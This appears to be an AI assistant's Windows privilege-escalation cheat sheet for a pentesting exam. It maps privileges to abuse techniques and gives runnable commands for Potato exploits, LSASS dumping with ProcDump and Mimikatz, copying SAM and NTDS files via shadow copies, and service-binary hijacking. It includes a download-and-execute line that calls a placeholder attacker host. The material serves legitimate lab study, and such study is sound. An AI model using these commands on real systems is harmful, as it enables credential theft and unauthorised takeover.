Good — below is a single-page, exam-ready reference you can paste into your notes. It lists the common Windows privileges, what each one _allows_ you to do (and therefore what abuses they enable), then a concise mapping to the _tools_ you can upload/run from Kali to exploit those privileges. At the end is a short, memorized checklist/flow you can run live during a lab/exam.

**Important legal/ethical note:** only use these techniques in labs, classrooms, or against systems you own or have explicit permission to test. Misuse against production or third-party systems without authorization is illegal.

---

# Windows Privileges — what they do & how they’re abused

> Format: **Privilege (well-known name)** — _short description_ → **Abuse / what it allows an attacker to do**

1. **SeImpersonatePrivilege (Impersonate a client after authentication)**
    
    - _Description:_ Allows a process to impersonate a security context/token of another user.
        
    - _Abuse:_ Potato-family attacks (JuicyPotato / SweetPotato / PrintSpoofer / RottenPotato) to escalate to SYSTEM by abusing COM/DCOM or Print Spooler RPC. Also token impersonation attacks for lateral movement.
        
2. **SeAssignPrimaryTokenPrivilege (Replace a process-level token)**
    
    - _Description:_ Create a new process using a specified primary token.
        
    - _Abuse:_ Used with token duplication/creation attacks to spawn SYSTEM processes. Often required/used alongside impersonation exploits.
        
3. **SeCreateTokenPrivilege (Create a token object)**
    
    - _Description:_ Ability to create access tokens; very powerful but rarely granted.
        
    - _Abuse:_ Create tokens and instantiate processes with elevated privileges (very high privilege).
        
4. **SeDebugPrivilege (Debug programs)**
    
    - _Description:_ Allows attaching a debugger to any process.
        
    - _Abuse:_ Dump lsass.exe (ProcDump, Task Manager) and extract credentials with Mimikatz. Also allows injecting into system processes and reading memory of privileged processes.
        
5. **SeBackupPrivilege (Back up files and directories)**
    
    - _Description:_ Allows backup APIs to ignore ACLs when reading files.
        
    - _Abuse:_ Read arbitrary files (including SAM, SYSTEM, NTDS.DIT) via backup APIs or using tools that call BackupRead. Useful to exfiltrate secrets without needing full admin.
        
6. **SeRestorePrivilege (Restore files and directories)**
    
    - _Description:_ Allows restore APIs to write files regardless of ACLs.
        
    - _Abuse:_ Drop/replace files (like service binaries) or restore files to locations where you normally cannot write → can lead to code execution via service hijack.
        
7. **SeTakeOwnershipPrivilege (Take ownership of objects)**
    
    - _Description:_ Take ownership of files/keys/objects even if you’re not the owner.
        
    - _Abuse:_ Take ownership of files or registry keys, change DACLs, write to service binaries and escalate.
        
8. **SeLoadDriverPrivilege (Load and unload device drivers)**
    
    - _Description:_ Load kernel-mode drivers.
        
    - _Abuse:_ Load malicious kernel drivers (rootkits) or signed driver bypasses for persistence / privilege escalation.
        
9. **SeSystemtimePrivilege (Change the system time)**
    
    - _Description:_ Set the system clock.
        
    - _Abuse:_ Rarely used for straight escalation; sometimes used to bypass certificate/time-based checks or cause race conditions.
        
10. **SeTcbPrivilege (Act as part of the operating system)**
    
    - _Description:_ Extremely powerful — lets a process act as OS (trust level) for certain operations.
        
    - _Abuse:_ Create tokens, manipulate authentication — effectively full control if granted.
        
11. **SeShutdownPrivilege / SeRemoteShutdownPrivilege**
    
    - _Description:_ Shut down or remotely shut down machine.
        
    - _Abuse:_ Disrupt services; in some chained attacks this can be used to force restart into a state that helps escalate.
        
12. **SeChangeNotifyPrivilege (Bypass traverse checking)**
    
    - _Description:_ Often granted to normal users; allows bypassing some file system checks.
        
    - _Abuse:_ Enables some attacks that rely on traversing file systems; usually not a direct escalation.
        
13. **SeManageVolumePrivilege**
    
    - _Description:_ Perform volume management tasks.
        
    - _Abuse:_ Mount/unmount or manipulate volumes; useful for some persistence or file access techniques.
        
14. **SeIncreaseQuotaPrivilege / SeIncreaseWorkingSetPrivilege**
    
    - _Description:_ Change a process’s memory quota / working set.
        
    - _Abuse:_ Rarely a direct vector but can assist with process manipulation.
        

---

# Common abuse patterns / quick mapping (Privilege → Primary exploit families)

- **SeImpersonatePrivilege** → JuicyPotato, SweetPotato, RottenPotato, PrintSpoofer (token impersonation via COM/Print Spooler).
    
- **SeAssignPrimaryTokenPrivilege / SeCreateTokenPrivilege / SeTcbPrivilege** → token creation/assignment; mimic or create tokens; used by advanced token manipulation tools.
    
- **SeDebugPrivilege** → Dump LSASS (ProcDump) → Mimikatz to extract cleartext/passwords/kerberos tickets.
    
- **SeBackupPrivilege / SeRestorePrivilege** → read/write protected files (SAM, SYSTEM, NTDS.DIT) via backup APIs or shadow copy techniques.
    
- **SeTakeOwnershipPrivilege** → icacls/takeown → change permissions on service binaries or registry keys → replace service binary to get SYSTEM.
    
- **SeLoadDriverPrivilege** → load malicious kernel driver.
    
- **Print Spooler running + impersonation rights** → PrintSpoofer exploitation.
    

---

# Tools you can upload/run from Kali (by privilege targeted)

> **Tip:** Upload the EXE/utility to the target (via an uploadable webshell, smb, or a staged download from Kali) and run in the shell you have. I list the _purpose_ first, then the typical short usage.

### Token impersonation / COM exploits (SeImpersonate)

- **JuicyPotato.exe** (JuicyPotato) — exploit COM CLSIDs to get SYSTEM
    
    - Typical usage (on target): `JuicyPotato.exe <CLSID> <port> <payload>` (try both x86/x64 builds).
        
    - When to run: `whoami /priv` shows `SeImpersonatePrivilege` OR you are in a service context.
        
- **SweetPotato.exe** — Juicy variant with webshell support
    
    - Usage: run from non-interactive shell; try different CLSID options and architecture.
        
- **PrintSpoofer.exe** — exploit Print Spooler RPC impersonation
    
    - Usage: `PrintSpoofer.exe <payload>` ; use if Print Spooler is running and Juicy fails.
        
- **RottenPotato.exe** — older variant; sometimes works on legacy systems.
    

### Debug / memory dumping (SeDebug)

- **Procdump.exe** (Sysinternals) — dump lsass:
    
    - Example: `procdump.exe -accepteula -ma lsass.exe lsass.dmp` → copy dump to Kali → run mimikatz on the dump.
        
- **Mimikatz.exe** — dump credentials / tickets
    
    - Example (on target or on dump): `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
        
    - If you only have dumped LSASS: `mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit`
        
- **SharpDump / SharpSploit** — .NET-based dumpers as alternatives (if PowerShell restricted).
    

### Backup/Restore / file read (SeBackup / SeRestore)

- **wbadmin / vssadmin / ntbackup / ntdsutil** (built-ins)
    
    - Use backup APIs or create shadow copies and copy protected files (e.g., `vssadmin create shadow /for=C:` then copy files).
        
    - If you have SeBackupPrivilege, you can use BackupRead-style tools to read files.
        
- **ntdsutil + esedbexport + secretsdump workflows** — for ntds.dit extraction if you can access system files.
    
- **Impacket secretsdump.py** — if you have credentials or a SYSTEM context you can dump hashes. Example from Kali to extract via SMB if auth known: `secretsdump.py domain/user:pass@dc` or use NTDS export.
    

### Ownership / ACL abuse (SeTakeOwnership)

- Built-ins: `takeown`, `icacls`
    
    - Example: `takeown /f C:\Program Files\SomeService\binary.exe` then `icacls binary.exe /grant <user>:F` → replace binary → restart service to escalate.
        
- **PowerUp.ps1** / **Seatbelt** / **SharpUp** — enumerate service misconfigurations and writeable service binaries.
    

### Driver load (SeLoadDriver)

- **Custom signed driver or rickety loader** — loads kernel driver (rare in labs, tricky on modern Windows). Tools vary and usually require kernel driver code.
    

### Enumeration helpers (good first steps; find which privilege you have)

- **whoami /priv** → check privileges (run this first).
    
- **winPEAS.exe / PowerUp.ps1 / SharpUp / Seatbelt** — great local enumeration to find weak privileges and misconfigurations.
    
    - Example: download/upload and run `winPEAS.exe` on the host; it reports SeImpersonate, unquoted services, weak perms, backup privilege, etc.
        

### Convenience / auxiliary

- **PowerShell Empire / Nishang** — for in-memory payloads and WMI, but avoid noisy persistent stuff in exams unless allowed.
    
- **PsExec.exe** (if you have creds) — spawn remote SYSTEM via SMB + Admin credentials; not a privilege-only exploit but useful after creds obtained.
    

---

# Quick actionable exam flow (memorize this)

1. **Initial checks (first 10 seconds on your shell)**
    
    ```
    whoami
    whoami /priv
    whoami /groups
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    tasklist /svc
    sc query spooler
    ```
    
    - If `SeImpersonatePrivilege` → try JuicyPotato / SweetPotato (both x86 and x64).
        
    - If `SeDebugPrivilege` → run `procdump -ma lsass.exe lsass.dmp` and then `mimikatz` locally or copy dump to Kali.
        
    - If `SeBackupPrivilege` → try shadowcopy / wbadmin / backup-API approaches to read SAM/NTDS files.
        
    - If `SeTakeOwnershipPrivilege` → use `takeown` and `icacls` to hijack writable service binary.
        
    - Run `winPEAS` / `SharpUp` to quickly flag likely paths.
        
2. **Token impersonation sequence**
    
    - Upload JuicyPotato.exe & associated CLSID list → try default CLSIDs → if fail, try SweetPotato (webshell) → if still fail, try PrintSpoofer.
        
3. **LSASS dump sequence (if debug)**
    
    - procdump -> copy -> mimikatz -> extract creds / tickets.
        
4. **Backup/NTDS sequence (if backup priv)**
    
    - create VSS / use backup API → export NTDS.DIT + SYSTEM → run esedbexport / secretsdump locally to extract hashes.
        
5. **If you get SYSTEM**
    
    - Enumerate, dump secrets with mimikatz/secretsdump, collect evidence and document steps for your report.
        

---

# Short example commands (for your cheat-sheet)

- Check privileges:
    
    ```
    whoami /priv
    ```
    
- JuicyPotato (on-target, architecture matters):
    
    ```
    JuicyPotato.exe <CLSID_GUID> <port> C:\Windows\System32\cmd.exe /c whoami
    ```
    
- SweetPotato (if webshell/non-interactive):
    
    ```
    SweetPotato.exe <options> C:\Windows\System32\cmd.exe /c whoami
    ```
    
- PrintSpoofer:
    
    ```
    PrintSpoofer.exe C:\Windows\System32\cmd.exe /c whoami
    ```
    
- Dump LSASS with ProcDump (Sysinternals):
    
    ```
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    ```
    
- Mimikatz (on target or on dump):
    
    ```
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
    ```
    
- Gain file access via backup (example idea):
    
    ```
    # create shadow copy (may require admin/backup)
    vssadmin create shadow /for=C:
    # copy file from shadow to tmp
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SYSTEM C:\temp\SYSTEM
    ```
    
- Take ownership & change ACL:
    
    ```
    takeown /f "C:\Program Files\Svc\svc.exe"
    icacls "C:\Program Files\Svc\svc.exe" /grant %USERNAME%:F
    ```
    
- Run local enumeration:
    
    ```
    # on target
    powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/winPEAS.ps1')"
    ```
    

---
